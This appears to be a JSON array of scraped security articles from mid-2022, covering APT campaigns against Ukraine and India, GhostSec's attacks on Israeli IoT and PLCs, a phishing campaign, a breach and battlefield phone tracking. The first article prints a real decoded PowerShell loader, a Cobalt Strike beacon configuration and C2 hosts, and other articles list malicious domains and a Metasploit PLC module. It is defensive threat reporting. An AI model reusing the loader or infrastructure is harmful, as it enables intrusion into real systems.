[
   {
      "time": "2022-07-15",
      "title": "Cobalt Strikes again: UAC-0056 continues to target Ukraine in its latest campaign",
      "text": " < PersonalFind the right productInfected already?< Business< PricingProtect your personal devices and dataProtect your team’s devices and dataExplore our award-winning endpoint security products, from EP to EDR to MDR< Partners< Resources< SupportThis blog was authored by Roberto Santos and Hossein JaziThe Malwarebytes Threat Intelligence team recently reviewed a series of cyber attacks against Ukraine that we attribute with high confidence to UAC-0056 (AKA UNC2589, TA471). This threat group has repeatedly targeted the government entities in Ukraine via phishing campaigns following the same common tactics, techniques and procedures (TTPs).Lures are based on important matters related to the ongoing war and humanitarian disaster happening in Ukraine. We have been closely monitoring this threat actor and noticed changes in their macro-based documents as well as their final payloads.In this blog, we will connect the dots between different decoy samples that we and others such as Ukraine CERT have observed. We will also share indicators for a previously undocumented campaign performed by the same threat actor at the end of June.The Help Ukraine lure, to our knowledge, has never been publicly documented before:Also, in the past we have found comments regarding to a domain named ExcelVBA[.]ru. This document was contacting a suspiciously similar domain named excel-vba[.]ru.Among victims, we find gov.ua emails being targeted. One of the texts used as email body in the last campaign was written in Ukrainian and translates to:On February 24, 2022, the army of the terrorist state – the Russian Federation, intervened on the territory of Ukraine. In order to counter the propaganda of the Russian government, the State Department of Statistics at the Office of the President of Ukraine prepared a consolidated report on the dead citizens of Ukraine, on the citizens of Ukraine who were left without a home, on the citizens of Ukraine who lost their jobs, on the number of destroyed homes, on the number of destroyed businesses as a result of an act of aggression . This report shows all the data broken down by regions of Ukraine. Familiarize yourself and familiarize your colleagues with the real state of affairs. Glory to Ukraine!The document will download an executable file named write.bin. Other attacks following the same scheme used different names for this file, including Office.exe, baseupd.exe and DataSource.exe. The file is slightly obfuscated, and performs the following actions:After some antidebug tricks, the registry key HKCUSoftwareMicrosoftWindowsCurrentVersionRunCheck License is used to establish persistence. \n\nNext step is dropping a file in C:ProgramDataTRYxaEbX.  This file will be used later.The payload will execute the following powershell Base64 encoded command:JABBADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFQAUgBZAHgAYQBFAGIAWAAiACkAOwAKACQAQgAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAQwBtAEEASgBuAGcAdgBkAEQAbQBpAFQAagBMAHgATgAiACkAOwAKACQAQQA9AHsAJABXACwAJABZAD0AJABBAHIAZwBzADsAJABYAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAFoAPQAoACQAWgArACQAWABbACQAXwBdACsAJABZAFsAJABfACUAJABZAC4ATABlAG4AZwB0AGgAXQApACUAMgA1ADYAOwAkAFgAWwAkAF8AXQAsACQAWABbACQAWgBdAD0AJABYAFsAJABaAF0ALAAkAFgAWwAkAF8AXQB9ADsAJABXAHwAJQB7ACQAVQA9ACgAJABVACsAMQApACUAMgA1ADYAOwAkAFYAPQAoACQAVgArACQAWABbACQAVQBdACkAJQAyADUANgA7ACQAWABbACQAVQBdACwAJABYAFsAJABWAF0APQAkAFgAWwAkAFYAXQAsACQAWABbACQAVQBdADsAJABfAC0AYgB4AG8AcgAkAFgAWwAoACQAWABbACQAVQBdACsAJABYAFsAJABWAF0AKQAlADIANQA2AF0AfQB9ADsACgAkAEMAIAA9ACAAKAAmACAAJABBACAAJABBADEAIAAkAEIAMQApADsACgAkAEUAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAEMALAAwACwAJABDAC4ATABlAG4AZwB0AGgAKQA7AAoAJABFACAAPQAgACQARQAgAC0AUwBwAGwAaQB0ACAAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoATgBlAHcATABpAG4AZQA7AAoAZgBvAHIAZQBhAGMAaAAoACQARQBFACAAaQBuACAAJABFACkAewBpAGUAeAAgACQAKAAkAEUARQArACIAOwAiACkAOwB9ADsAThe chunk before is Base64 encoded; which decodes to:$A1 = [System.IO.File]::ReadAllBytes(\"C:ProgramDataTRYxaEbX\");$A={$W,$Y=$Args;$X=0..255;0..255|%{$Z=($Z+$X[$_]+$Y[$_%$Y.Length])%256;$X[$_],$X[$Z]=$X[$Z],$X[$_]};$W|%{$U=($U+1)%256;$V=($V+$X[$U])%256;$X[$U],$X[$V]=$X[$V],$X[$U];$_-bxor$X[($X[$U]+$X[$V])%256]}};$C = (& $A $A1 $B1);$E = (New-Object -TypeName System.Text.UTF8Encoding).GetString($C,0,$C.Length);$E = $E -Split [Environment]::NewLine;foreach($EE in $E){iex $($EE+\";\");};In short the file dropped in C:ProgramDataTRYxaEbX will be decrypted using \n\nHere we can see some of the actions that will be taken:After this step, another Base64 payload is decoded and executed:As it can be seen, the main functionality provided by this second PowerShell file is to inject shellcode. This shellcode can be 32 or 64 bit, and is a Cobalt Strike beacon with the following configuration:BeaconType                    – HTTPSPort                              – 443SleepTime                       – 30000PublicKey_MD5              – defb5d95ce99e1ebbf421a1a38d9cb64C2Server                         – skreatortemp.site,/s/08u1XdxChhMrLYdTasfnOMQpbsLkpq3o/field-keywords/UserAgent                       – Mozilla/5.0_Frsg_stredf_o21_rutyyyrui_type (Windows NT 10.0; Win64; x64; Trident/7.0; D-M1-200309AC;D-M1-MSSP1; rv:11.0) like Gecko_10984gapHttpPostUri                    – /nBz07hg5l3C9wuWVCGV-5xHHu1amjf76F2A8i/avp/amznussraps/Watermark                      – 1580103824By having a Cobalt Strike instance running on the victim’s machine, it is now fully compromised.At the time of writing, malicious C&C servers seem to be down. However, on July 5 we saw active servers and successful connections to our test environment. The attackers actively sent reconnaissance commands to the machine, listing the content of several folders.We consider these actions preliminary moves to check whether the machine is a viable target or not before following up with other actions.Based on recent attacks reported by CERT UA, as well as the similarities indicated at the beginning of the blog, we can attribute this attack with high confidence to UAC-0056.Signatures contained in the Cobalt Strike beacons (watermark 1580103824 and public key \n\nHowever, it is important to note that in that case we cannot simply rely on a public key to attribute the sample we analyzed in this report. In fact, these signatures have been attributed to many different groups. Our assessment is that the group used a leaked version of Cobalt Strike and used the same private key as others, making attribution harder.Malwarebytes users were protected against this campaign thanks to our Anti-Exploit layer.Malicious Excel documents (Help Ukraine template)fe3bc87b433e51e0713d80e379a61916ceb6007648b0fde1c44491ba44dc1cb3c9675483ab362bc656a9f682928b6a0c3ff60a274ade3ceabac332069480605a1b95186ecc081911c3a80f278e4ed34ee9ef3a46f5cf1ae8573ac3a4c69df532258a9665af7120d0d80766c119e48a4035ee3b68676076bf3ed6462c644fe7d0e663bb4d9506e7c09bcf7b764d31b61d8f7dbae0b64dd4ef4e9d282e1909d386ecd2bb648a9ad28069c1ec4c0da546507797fdf0243e9e5eece581bf702675ffeac9a4d9b63a0ca68194eae433d6b2e9a4531b60b82faf218b8dd4b69cec09dfMalicious Excel documents (Humanitarian template)024054ff04e0fd75a4765dd705067a6b336caa751f0a804fefce787382ac45c114736be09a7652d206cd6ab35375116ec4fad499bb1b47567e4fd56dcfcd22ea474a0f0bb5b17a1bb024e08a0bb46277ba03392ee95766870c981658c4c2300dPayloads0709a8f18c8436deea0b57deab55afbcea17657cb0186cbf0f6fcbb551661470aadd8c7c248915c5da49c976f24aeb98ccc426fb31d1d6913519694a7bb9351afb2a9dcfcf41c493fb7348ff867bb3cad9962a04c9dfd5b1afa115f7ff737346501d4741a0aa8784e9feeb9f960f259c09cbceccb206f355209c851b7f094effCobalt Strike beacon and payloads136.144.41[.]177syriahr[.]eu/s/Xnk75JwUcIebkrmENtufIiiKEmoqBN/field-keywords/syriahr[.]eu/nzXlLVas-VALvDh9lopkC/avp/amznussraps/skreatortemp[.]siteimolaoggi[.]euSHARE THIS ARTICLENovember 23, 2023 - Google has set a date for the introduction of Manifest V3 which will hurt the capabilities of many ad blockers.November 23, 2023 - What better way to kick off the holiday scamming season than by offering a Black Friday sale on one of the most popular products around: a Stanley cup.November 22, 2023 - Here are the innovations we’ve made in our products recently. Are you making the most of them?November 22, 2023 - Google's recently been accused of \"privacy washing\", despite claiming its a privacy-focused company. But what is privacy washing?November 21, 2023 - Nothing's new message app Chats has been pulled from Google Play after harsh criticism about security issues.ABOUT THE AUTHOR\n\t\t\t\t\tCyberprotection for every one.\t\t\t\t\tCOMPANYMY ACCOUNTADDRESSOne Albert Quay2nd FloorCork T12 X8N6Ireland3979 Freedom Circle12th FloorSanta Clara, CA 95054Want to stay informed on the latest news in cybersecurity? Sign up for our newsletter and learn how to protect your computer from threats.\n\t\t\t\t\t\t© 2023 All Rights Reserved\t\t\t\t\t\tSelect your language"
   },
   {
      "time": "2022-07-15",
      "title": "Transparent Tribe begins targeting education sector in latest campaign",
      "text": " Typically, this APT group focuses on targeting government (government employees, military personnel) and pseudo-government entities (think tanks, conferences, etc.) using remote access trojans (RATs) such as CrimsonRAT and ObliqueRAT. However, in this new campaign dating back to December 2021, the adversary is targeting students of universities and colleges in India. This new campaign also suggests that the APT is actively expanding its network of victims to include civilian users.We also assess with high confidence that a Pakistani web hosting services provider, \"ZainHosting\" was employed by the APT for deploying and operating parts of Transparent Tribe's infrastructure used in this campaign.The group primarily uses three Windows-based malware families to carry out espionage activities against their targets.Malicious macro dropping embedded zip to disk. The CrimsonRAT payloads deployed in this campaign are very similar to those from past Transparent Tribe campaigns. It is the staple implant of choice for Transparent Tribe to establish long-term access into victim networks. This RAT is actively updated, adding new capabilities and obfuscating the implant.The latest version of CrimsonRAT seen in this campaign contains a number of capabilities, including:A number of these maldocs and archives containing these maldocs were hosted on the domains registered by the attackers, with the earliest domain registered in June 2021. These domains were named so that they would appear relevant to students and educational entities in India. Some examples of domains registered by the threat actor are:During the course of our research, we discovered SSL certificate overlaps with another domain registered by the attackers in June 2021, geo-news[.]tv, using the email address immikhan034[@]gmail[.]com. This domain is a typo-squatted version of geo[.]tv, a legitimate Pakistani news website. Subdomains on the malicious typo-squatted domains include those that hosted SSL certificates for the student and media-themed malicious domains:All the malicious domains have recently resolved to the same IP address: 198[.]37[.]123[.]126. This strongly suggests shared infrastructure among all the malicious domains.SSL certificate for geo-news[.]tv. Many of the domains registered by the attackers for this campaign consisted of rudimentary websites with front pages containing embedded Google Drive folders. All of these folders contained pictures of women. It is highly likely that these front pages will be used as stagers for honeytrap-based attacks in the future, another tactic typical of the Transparent Tribe APT.Google Drive folder embedded in the fake website operated by Transparent Tribe. The DNS SOA records for all the malicious domains utilized in this APT campaign contain a common administrator email address: rupees001[at]gmail[.]com. This email address has been used to register and administer approximately 2,000 legitimate and malicious domains. However, there are a couple of domains in this list that stand out:Of the two domains, vebhost[.]com hosts a dummy website that advertises website-building services. The malicious domains used in this campaign, such as studentsportal[.]live and others, use vebhost[.]com name servers, specifically:Therefore, it is highly likely that the operators registering and maintaining the malicious domains also operate web-hosting services through vebhost[.]com.The second domain, zainhosting[.]net belongs to a seemingly legitimate web services and hosting provider called \"Zain Hosting\" based out of Lahore, Pakistan.Apart from zainhosting[.]net, the hosting provider also operates zainhosting[.]com, which is this business' primary front for their legitimate operations. Interestingly, vebhost[.]com uses zainhosting[.]com's name servers:ZainHosting advertises their services heavily on Facebook and has been active since at least 2010. Their webpage from 2010 listed rupees001[at]gmail[.]com as a contact address for the business. This email has since been used to register, renew and administer several malicious web pages over time, including the malicious domains used by the Transparent Tribe APT in their most recent campaign.ZainHosting webpage from 2010 listing rupees001[at]gmail[.]com as a contact address. All three sets of domains -- the malicious Transparent Tribe infrastructure, vebhost[.]com and zainhosting[.]net/com -- are clearly related, with \"ZainHosting\"' owning and operating the malicious infrastructure. However, the entire scope of ZainHosting's role in the Transparent Tribe organization is still unknown. We believe with high confidence that ZainHosting is just one of the many infrastructure contractors hired by Transparent Tribe. Such contractors might be hired to simply prepare and stage the APT's infrastructure and possibly be given packages (archives, etc.) containing malicious artifacts to deploy, that are then distributed by the APT operators themselves to targets of interest.Transparent Tribe has been aggressively trying to widen its net of victims in the Indian subcontinent. Their operations started as early as at least 2016 and have largely focussed on infecting government and military officials in Afghanistan and India. Over the past few years, we saw the APT begin targeting pseudo-government entities and individuals belonging to think tanks and defense contractors.However, their new campaign indicates that the threat actors' strategy is evolving to target civilian personnel, specifically those connected to educational institutions. This might be in accordance with their nation-state's goal to establish long-term access and steal valuable and restricted research from premier research institutions associated with the Indian government. Keeping tabs on an adversary nation's research endeavors is a strategic goal adopted by many APT groups observed across the world.Organizations must be diligent against such highly motivated adversaries that are rapidly evolving their strategies and expanding their network of targets. In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises and reviewed and improved every time it's put to the test on real engagements.Ways our customers can detect and block this threat are listed below.bdeb9d019a02eb49c21f7c04169406ac586d630032a059f63c497951303b8d00\n388f212dfca2bfb5db0a8b9958a43da6860298cdd4fcd53ed2c75e3b059ee622\n0d61d5fe8dbf69c6e61771451212fc8e587d93246bd866adf1031147d6d4f8c2\n14ee2e3a9263bab359bc19050567d0dbd6371c8c0a7c6aeba71adbf5df2fc35b8c1a5052bf3c1b33aff9e249ae860ea1435ce716d5b5be2ec3407520507c6d37\n79aee357ea68d8f66b929ba2e57465eaee4d965b0da5001fe589afe1588874e38b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0\nb4819738a277090405f0b5bbcb31d5dd3115f7026401e5231df727da0443332a\ne2cf71c78d198fdc0017b7bfd6ce8115301174302b3eaaf50cfc384db96bc573\n8c9b0fd259e7f016f53be8edc53fe5f908b48ae691e21f0f820da11429e595d8\nf3a1ac021941b481ac7e2335b74ebf1e44728e8917381728f1f5b390c6f34706\nfc34f9087ab199d0bac22aa97de48e5592dbf0784342b9ecd01b4a429272ab5b\nb3f8e026f39056ec5e66700e03eeaf57454ee9c0bc1c719d74e10f5702957305\n9159d4e354218870461c96bedcc7b5b026f872d30235bb4536cc4a5ce4154725\nb614436bf9461b80384bae937d699f8c3886bcc65b907e0c8126b4df59ea8cdb\n28390e3ea8a547f05ca08551f484292d46398a2b38fd4aae001ac7d056c5abc0192[.]3[.]99[.]68\n198[.]37[.]123[.]126studentsportal[.]live\ngeo-news[.]tv\ncloud-drive[.]store\nuser-onedrive[.]live\ndrive-phone[.]online\nstudentsportal[.]co\nstudentsportal[.]website\nnsdrive-phone[.]online\nstatefinancebank[.]com\nin[.]statefinancebank[.]com\ncentralink[.]online\ncloud-drive[.]geo-news[.]tv\ndrive-phone[.]geo-news[.]tv\nstudentsportal[.]geo-news[.]tv\nuser-onedrive[.]geo-news[.]tv\nstudentsportal[.]live[.]geo-news[.]tv\nphone-drive[.]online[.]geo-news[.]tv\nsunnyleone[.]hopto[.]org\nswissaccount[.]ddns[.]nethxxps[://]studentsportal[.]live/download[.]php?file=Mental_Health_Survey[.]docm\nhxxps[://]studentsportal[.]website/download[.]php?file=5-mar[.]zipCisco Talos has recently observed an increase in activity conducted by 8Base, a ransomware group that uses a variant of the Phobos ransomware and other publicly available tools to facilitate their operations.Cisco Talos identified the most prolific Phobos variants, TTPs and affiliate structure, based on their activity and analysis of over 1,000 samples from VirusTotal dating back to 2019. We assess with moderate confidence Eking, Eight, Elbie, Devos and Faust are the most common variantsCisco Talos has recently observed an increase in spam messages abusing a feature of quizzes created within Google Forms."
   },
   {
      "time": "2022-07-15",
      "title": "Microsoft: 10,000 Organizations Targeted in Large-Scale Phishing Campaign - SecurityWeek",
      "text": " Hi, what are you looking for?Microsoft has warned users about a large-scale phishing campaign that has been targeting over 10,000 organizations to perform follow-on business email compromise (BEC).ByFlipboardRedditWhatsappWhatsappEmailIonut Arghire is an international correspondent for SecurityWeek.Subscribe to the SecurityWeek Email Briefing to stay informed on the latest threats, trends, and technology, along with insightful columns from industry experts.Join us as we delve into the transformative potential of AI, predictive ChatGPT-like tools and automation to detect and defend against cyberattacks.As cybersecurity breaches and incidents escalate, the cyber insurance ecosystem is undergoing rapid and transformational change. FlipboardRedditWhatsappWhatsappEmailThe changing nature of what we still generally call ransomware will continue through 2023, driven by three primary conditions.As it evolves, web3 will contain and increase all the security issues of web2 – and perhaps add a few more.A recently disclosed vBulletin vulnerability, which had a zero-day status for roughly two days last week, was exploited in a hacker attack targeting the...Luxury retailer Neiman Marcus Group informed some customers last week that their online accounts had been breached by hackers.Zendesk is informing customers about a data breach that started with an SMS phishing campaign targeting the company’s employees.Satellite TV giant Dish Network confirmed that a recent outage was the result of a cyberattack and admitted that data was stolen.The release of OpenAI’s ChatGPT in late 2022 has demonstrated the potential of AI for both good and bad.A new study by McAfee and the Center for Strategic and International Studies (CSIS) named a staggering figure as the true annual cost of...Got a confidential news tip? We want to hear from you.Reach a large audience of enterprise cybersecurity professionals Subscribe to the SecurityWeek Daily Briefing and get the latest content delivered to your inbox.Copyright © 2023 SecurityWeek ®, a Wired Business Media Publication. All Rights Reserved. \n\n"
   },
   {
      "time": "2022-07-15",
      "title": "Canadian airlines suffer delays and cancellations due to Zayo outage",
      "text": " Air travel across Western Canada was impacted Thursday by an internet outage affecting the country’s air navigation service provider Nav Canada. Company spokesperson Brian Boudreau told The Record that there was a disruption in the network of Zayo, a telecommunications provider that Nav Canada uses in parts of the country's western region. Zayo, which is based in Colorado, is a multibillion-dollar company offering communications infrastructure services, including fiber and bandwidth connectivity, colocation and cloud infrastructure.“NAV Canada is actively engaging Zayo to ensure every effort is being made to restore the service as soon as possible and to understand restoration timelines,” Boudreau said. “As such, air traffic control will reduce the flow of departures and arrivals temporarily in some situations until Zayo has restored service. Procedures are in place to assure safety of aircraft in our airspace. We regret the inconvenience to air carriers and their passengers due to this third-party outage. Passengers are encouraged to check with their airlines for specific details regarding flight delays and cancellations.”A spokesperson for Zayo told The Record that it is working to restore service \"following the disruption of two key fiber lines managed by one of our underlying fiber providers in Canada, including an outage caused by a train derailment yesterday evening.\" \"We have rerouted a significant volume of traffic via other routes so that our customers can begin resuming normal operations,\" the spokesperson said. \"We regret the inconvenience this has caused for our customers and air passengers, and our top priority is the safety of everyone involved.”WestJet, a Canadian airline operating in the region, explained in statements to The Record that it too was impacted by the Zayo outage. On Thursday morning, the airline said its check-in services, flight planning and payment services were affected. They asked customers to arrive early at the airport to get ahead of the outages. The company also said it was having issues with the self-serve baggage drop services at Calgary, Ottawa, Saskatoon and Halifax.“We are working with all external parties to fully resolve and can confirm we are also impacted by the Zayo outage,” the company said, noting that its services were restored Thursday afternoon.  “Across our network we have seen three cancellations and more than 100 flights have been delayed as a result of the outage. At this time, self-serve baggage drop continues to experience issues at Calgary (YYC). Guests traveling from YYC are encouraged to arrive early to have baggage processed by an agent.”The outage comes days after Canadians dealt with an alarming 19-hour outage that crippled parts of the country’s internet, phone, banking and emergency services. The outage was allegedly caused by a technical problem within the systems of Rogers, one of the country’s largest telecommunications companies. WestJet said Thursday's outage was not connected to the Rogers issue. Jonathan Greig is a Breaking News Reporter at Recorded Future News. Jonathan has worked across the globe as a journalist since 2014. Before moving back to New York City, he worked for news outlets in South Africa, Jordan and Cambodia. He previously covered cybersecurity at ZDNet and TechRepublic.© Copyright 2023 | The Record from Recorded Future News"
   },
   {
      "time": "2022-07-15",
      "title": "GhostSec Raising the Bar",
      "text": " Frost & Sullivan Names Cyberint \"Company of the Year\" in External Risk Mitigation & Management CategoryIn June 2022, Cyberint observed a new hacktivist campaign targeting multiple Israeli organizations and enterprises coordinated via different social media platforms. The campaign is led by hacktivists originating in a group called GhostSec.GhostSec was first identified in 2015 and was initially founded to attack ISIS in the cyber realm as part of the fight against Islamic extremism. In past years, the group participated in several campaigns against several counties including Nigeria, Colombia, Lebanon and South Africa. From the start of the Russian-Ukrainian war, the group sided with Ukraine and published mainly Russian-related leaks, DDOS, and content under the campaign #OpRussia.At the end of June 2022, the group declared it was joining the #OpIsrael campaign. Immediately after their announcement, the group pivoted from their regular operations and started to target multiple Israeli companies, presumably gaining access to various IoT interfaces and ICS/SCADA systems, which led to possible disruptions.The group is well aware of the public relations and news activities related to their operations, responding on social media platforms about what they are up to. Group members are mainly active on Telegram and Twitter, the platforms primarily used to share their target lists and attack results.GhostSec, a vigilante group managed and operated by hacktivists, was originally founded prior to 2014 and was initially called ‘We Are The Resistance’.Acting as ‘We Are The Resistance’, the group didn’t participate in glorious attacks and campaigns, instead mainly trained enthusiastic beginner-level cyber candidates (a.k.a script kiddies), including publishing various cyber-quizzes.In 2015, the group’s activity increased and they rebranded themselves as GhostSec joining the fight against ISIS and Islamic extremism. Throughout 2015, the group was associated with taking down hundreds of ISIS websites and social media accounts while gaining the cooperation of law enforcement. By the end of 2015, GhostSec decided to transform its fight against ISIS officials, stopped cooperating with the Anonymous hacktivist group, and renamed itself Ghost security Group[1].The members who opposed this process continued operating under the name GhostSec and currently seem to target Israeli and American companies.The GhostSec hacktivist group is active on multiple social media platforms:The group maintains a Telegram account with currently more than 8K followers. The account is mainly used for publications and announcements rather than as a sharing tools or instructions. Their Telegram group has been active since November 2020 and was involved in several campaigns including #OpNigeria #OpColombia and #OpRussia.  Additionally, Cyberint was able to trace several social media accounts of GhostSec members:    (possibly Nicola Ivikov)    Going back to 2018, Cyberint detected that the group was targeting the Israeli Airforce website. GhostSec took responsibility for the website’s takedown on their Twitter account.An additional attack on an Israeli target was published in 2021, when the group attacked H.R.V.A.C., an Israeli engineering company involved in the Ben Gurion Airport Energy Center project. According to GhostSec, the website was taken down, and the data was dumped. Later, in 2021, the group shared a thin 10MB file presumably containing internal data from the H.R.V.A.C website.The subsequent activity against Israeli targets began on June 28, 2022, followed by an announcement that the group had officially joined the ‘OpIsrael’ campaign due to continuous Israeli attacks against Palestinians.Less than an hour later, an IoT attack began. The group uploaded a video to their Telegram channel that showed that an air conditioning interface belonging to bezeqint.net, a major ISP in Israel, was hacked.On June 29, the group shared additional video evidence of the exposed interface of ELNet, an energy meter and electrical power meter at MATAM (acronym for the Scientific Industries Center) being accessed by the group. According to the group, they gained access to five similar IoT devices in different locations and modified the settings to switch the lights off in all five of them.Another IoT device was added to the victim’s list: The group accessed the Partner.co.il interface of an IoT-based smart sprinkling system. However, there was no evidence of a disruption of the systems’ workflow.On July 6, the group shared screenshots of EEM devices, measuring electrical parameters in low-voltage. In addition, the group also shared Or Akiva’s pump station IoT interface, whose activities the group claims to have disrupted.After deploying IoT attacks on multiple Israeli Organizations, the group shifted into the SCADA/ICS domain, attacking  Israeli PLCs (Programmable Logic Controller) using the Metasploit framework module “auxiliary/admin/scada/multi_cip_command”. This vulnerability was first disclosed in 2012, and continues to be modified (2020). The exploit implements the CPU STOP command, as well as the ability to crash the Ethernet card in an affected device.To date, around 5000 PLCs worldwide are exposed via port 44818, and might be affected by this kind of attack.The group members maintain several GitHub accounts. These accounts contain tools that group members use. The main repository used by the group, ghostsec420, includes seven repositories, some of which include campaign output such as the NigeriaLeaks, vulnerability scanners and exploits. The most interesting is the Sophisticated Cyber Penetration Attacks (SCPA) repository, which contains advanced attack tools and guides from various sources, one of which is last September’s plug and play Conti affiliate playbooks leak, and might still be in use to target future victims.One of the directories also obtained from Conti’s repository leak is the CVE directory, which contains exploits and user instructions from Conti’s playbook. Among the exploits are ZeroLogon and DirtyPipe. The full list contains different and updated versions to those leaked from Conti:Metabase_CVE-2021-41277In addition to the GitHub account, the group also has a Pastebin user called xGhostSecx, which has been active for a couple of years. The account includes anti-Israeli logs from an online reconnaissance tool, which resulted in a list of domains and IPs of governmental entities in 2021.Recently, Cyberint detected a paste on a paste site named pst.klgrth.io, published by the group on July 8 with the topic ‘Op Israehell’.  The paste includes partial reconnaissance output of what GhostSec claims to be “state-owned companies”, such as Rafael, Bank Hapoalim, Israel Post, IEC, etc.The paste includes a target list of several companies’ subdomains and their corresponding IP addresses, which can later be used to execute malicious activity against these companies. Additionally, it is possible that the information gathered may be exploited by other threat actors seeking to attack Israeli companies.Ghostsec is still highly active. In July 2023 Brazilian Senior Sistemas was leaked by GhostSec and Stormous. Cyberint detected a leak from the Brazilian software company, Senior Sistemas, which was disclosed by the threat actor group GhostSec. The attack was carried out in collaboration with the Stormous threat actor group. The leak was made public after Senior Sistemas denied being hacked, prompting GhostSec to release this 8GB data dump. Notably, Senior Sistemas holds a significant presence in both the private and public sectors in Brazil.The GhostSec group is not the usual DDOS/defacement hacktivist group we are familiar with from the #Opisrael operations. The group’s core members have participated in multiple campaigns for a long time. The group maintains its arsenal and set of techniques to assess damage in numerous attack vectors, from website hacking to IoT and ICS/SCADA PLCs.Cyberint Copyright © All Rights Reserved 2023Fill in your business email to start"
   },
   {
      "time": "2022-07-15",
      "title": "\r\n\t1.9 Million Healthcare Records Breached in Ransomware Attack - Infosecurity Magazine\r\n",
      "text": " Contributing Writer & North America Webinar ModeratorUS debt collector Professional Finance Company (PFC) has reported a data breach affecting 1.9 million individuals across over 650 different healthcare providers.The Colorado-based company, which chases outstanding debts for healthcare companies, said that an unauthorized intruder accessed personal data including names, addresses, amount owing, and information regarding payments made to accounts. Some individuals also had their social security number, date of birth, and health insurance and medical treatment information exposed, it warned.The company noticed the ransomware attack on February 26. It bought in forensics experts and informed law enforcement but did not inform healthcare providers until early May.PFC is contacting individuals potentially affected by the breach and will offer them free credit monitoring.The Department is currently investigating the incident, which would be the second largest under investigation this year. The first was a breach of two million records reported in May by Shields Health Care Group. That attack potentially affected 2 million records, according to the DHHS."
   },
   {
      "time": "2022-07-15",
      "title": "The weaponizing of smartphone location data on the battlefield - Help Net Security",
      "text": " For a country at war, monitoring the cellular networks in the conflict zone provides the most comprehensive view of mobile device activity. But before the conflict even begins, the nation can identify phones of interest, including the devices belonging to soldiers.Spies can also physically monitor known military sites and use devices known as IMSI catchers – essentially fake cell towers – to collect phone data from the phones in the vicinity. The Kremlin reportedly did this in the UK, with GRU officers gathering near some of the UK’s most sensitive military sites.When a phone of interest appears on the monitored mobile network, the country can keep a close eye on the device’s location and other cellular data. The presence of two or more such devices in close proximity indicates that a mission may be taking place.To counter these location-finding drones, an opposing nation may jam a drone’s GPS signal, using a radio emitter to block the drone from receiving GPS signals. The country can also try GPS spoofing, employing a radio transmitter to corrupt the accuracy of the drone’s reported location. To counter such spoofing, systems for validating GPS signals have been deployed on the battlefield. In the larger picture, the corruptibility of GPS data has forced some nations to build their own geopositioning systems. For the US, M-Code serves as a military-only GPS signal that is both more accurate and provides anti-jamming and anti-spoofing capabilities.Spyware is a more targeted approach to obtaining location data. It can be delivered over the cell network (via a malicious carrier update) or through an IMSI catcher. It’s also not uncommon for operators to pose as single women on social media sites to lure soldiers into downloading a malicious app. Hamas has reportedly used this tactic many times against Israeli soldiers. Such spyware can capture a device’s real-time location, among other capabilities.Of all the signals given off by smartphones in the normal course of operation, location data is perhaps the most valuable during battle. Unlike captured conversations or call metadata, location data is actionable immediately. Location data can reveal troop movements, supply routes and even daily routines. A cluster of troops in a given location may signal an important location. Aggregated location data can also reveal associations between different groups.The obvious risk to soldiers is that their location data can be used by the enemy to direct targeted attacks against them. Notably, it has been reported that a Russian general and his staff were killed in an airstrike in the early weeks of the invasion after his phone call was intercepted and geolocated by the Ukrainians.Short of lethal strikes, location data can be used to inform a country’s strategy. For example, Russia’s phone data-collecting drone flights over Poland and the Baltic states in 2017 suggested to military experts that the country was trying to monitor troop levels at NATO’s new bases to see if there were more forces present there than the alliance had disclosed publicly.To counter the capture of location data from soldiers’ smartphones, many countries have understandably banned the presence of these devices on the battlefield. In 2019, for instance, Russia’s parliament unanimously voted to ban smartphones and tablets from being used by on-duty armed forces. However, banning mobile device usage by soldiers who have never known a world without smartphones has its limitations. Since the invasion began, there have been multiple instances of Russian commanders confiscating their subordinates’ personal phones for fear that they would unwittingly give away the locations of their units.Soldiers are also advised to shield their true locations when smartphones are used. Ukrainian soldiers, for example, are instructed to walk at least 1,600 feet away from their squad position in order to make a phone call, ideally to an area with many civilians. Soldiers can also use a Faraday case to cloak their direction of travel, first heading in the wrong direction before placing their phone in the case. Using a Faraday case is a safer option than turning off the phone, as powering off is a signal in its own right that can invite additional scrutiny, and as the phone may have been hacked to appear to be off when it’s in fact still on and transmitting signals to the enemy.Smartphones are so ubiquitous that their presence on the battlefield is inevitable, even when they’ve been prohibited or otherwise discouraged from use due to lethal consequences. But each location ping gives the enemy another signal that may ultimately culminate in a targeted missile strike or an improved defensive posture. The side that can best fight this information battle very likely has the upper hand in winning the war."
   }
]